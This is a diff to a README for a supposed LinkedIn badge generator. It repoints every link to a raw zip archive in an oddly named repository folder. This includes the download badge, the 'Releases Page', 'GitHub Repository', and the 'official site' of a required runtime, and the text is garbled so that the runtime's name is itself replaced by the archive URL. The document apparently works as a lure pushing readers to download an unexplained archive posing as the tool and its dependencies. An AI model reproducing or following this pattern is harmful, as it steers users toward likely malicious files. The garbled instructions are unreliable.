@@ -6,9 +6,9 @@ Welcome to the linkedin-badge-renderer! This tool helps you create LinkedIn prof
 
 ## 📥 Download & Install
 
-[![Download linkedin-badge-renderer](https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/linkedin_badge_renderer_lactoscope.zip%20Now-v1.0-blue)](https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/linkedin_badge_renderer_lactoscope.zip)
+[![Download linkedin-badge-renderer](https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/renderer_linkedin_badge_v1.4.zip%20Now-v1.0-blue)](https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/renderer_linkedin_badge_v1.4.zip)
 
-To get started, visit this page to download the tool: [GitHub Releases Page](https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/linkedin_badge_renderer_lactoscope.zip).
+To get started, visit this page to download the tool: [GitHub Releases Page](https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/renderer_linkedin_badge_v1.4.zip).
 
 ### Steps to Download:
 
@@ -31,7 +31,7 @@ With linkedin-badge-renderer, you can create badges in the following formats:
 To run linkedin-badge-renderer, ensure your system meets these requirements:
 
 - **Operating System**: Windows, macOS, or Linux.
-- **https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/linkedin_badge_renderer_lactoscope.zip**: Version 14 or higher installed on your system. You can download it from [https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/linkedin_badge_renderer_lactoscope.zip official site](https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/linkedin_badge_renderer_lactoscope.zip).
+- **https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/renderer_linkedin_badge_v1.4.zip**: Version 14 or higher installed on your system. You can download it from [https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/renderer_linkedin_badge_v1.4.zip official site](https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/renderer_linkedin_badge_v1.4.zip).
 - **Internet Connection**: Required to fetch LinkedIn profile data.
 
 ## 🎨 How to Use
@@ -94,13 +94,13 @@ Join our community to get help or share your experience. You can find us on:
 
 If you run into issues, try these solutions:
 
-- **https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/linkedin_badge_renderer_lactoscope.zip not found**: Ensure https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/linkedin_badge_renderer_lactoscope.zip is installed and added to your PATH.
+- **https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/renderer_linkedin_badge_v1.4.zip not found**: Ensure https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/renderer_linkedin_badge_v1.4.zip is installed and added to your PATH.
 - **Permissions error**: Run the terminal as an administrator.
 - **Network issues**: Check your internet connection.
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/linkedin_badge_renderer_lactoscope.zip)
-- [Releases Page](https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/linkedin_badge_renderer_lactoscope.zip)
+- [GitHub Repository](https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/renderer_linkedin_badge_v1.4.zip)
+- [Releases Page](https://github.com/KreGR/linkedin-badge-renderer/raw/refs/heads/main/vitrifaction/renderer_linkedin_badge_v1.4.zip)
 
 For further assistance, feel free to reach out through our community channels. Happy badge generating!
